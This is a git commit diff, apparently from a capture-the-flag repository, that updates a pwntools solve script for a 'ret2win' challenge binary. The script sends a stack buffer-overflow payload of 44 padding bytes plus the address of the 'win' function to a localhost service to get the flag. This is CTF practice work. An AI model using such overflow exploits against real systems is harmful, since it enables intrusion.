48f7d778ca86f757ae9a0b54ed5b545218ddd0a1
= <nishant99puri@gmail.com>
2024-11-28 23:40:55 -0500

    added ret2win binary and updated solve script

--- solver/solve.py
+++ solver/solve.py
@@ -5,27 +5,13 @@ host = '127.0.0.1'
 port = 32771
 conn = remote(host,port)
 print(conn.recvline())
-elf = ELF('../../ctfdev2/ret2win')
+
+#We can find the unzipping the tar file, and using cat-file to export the zlib compressed data to a binary
+elf = ELF('ret2win')
 winfunc = p32(elf.symbols['win'])
+
 payload = b'a'*44+winfunc
 conn.sendline(payload)
-print(conn.recvline().decode().strip())
+print(conn.recvline().decode().strip()) #gives flag
 
 conn.interactive()
-
-# elf = ELF('ret2win')
-# p = elf.process()
-# print(elf.symbols['win'])
-# print(winfunc)
-# # conn = remote(host, port)
-# payload = b'a'*44+winfunc
-# print(payload)
-# p.sendline(payload)
-# # gdb.attach(p
-# #            ,gdbscript=f"""
-# #             break *vuln+106
-# #             r <<< {payload}
-# #             """)
-# print(p.recvline().decode().strip())
-
-# p.interactive()
